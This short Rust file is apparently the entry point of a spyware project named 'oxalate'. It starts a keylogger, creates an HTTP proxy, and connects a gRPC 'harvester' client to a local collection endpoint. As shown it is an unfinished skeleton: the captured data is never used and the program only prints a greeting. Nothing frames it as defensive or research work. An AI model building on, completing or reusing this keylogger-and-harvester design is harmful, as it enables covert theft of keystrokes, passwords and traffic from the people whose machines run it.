use std::time::Duration;

use oxalate_keylogger::spawn_keylogger;
use oxalate_proxy::{HttpProxy, ProxyHttpResponse};

use crate::harvester::harvester_client::{self, HarvesterClient};

pub mod init_proxy;

pub mod harvester {
    tonic::include_proto!("harvester");
    // pub(crate) const FILE_DESCRIPTOR_SET: &[u8] =
    //     tonic::include_file_descriptor_set!("harvester_descriptor");
}

#[tokio::main]
async fn main() {
    let grpc_client = HarvesterClient::connect("0.0.0.0:6767").await.unwrap();
    let rx = spawn_keylogger();
    let http_proxy = HttpProxy::new(Duration::from_secs(1));

    println!("Hello, world!");
}
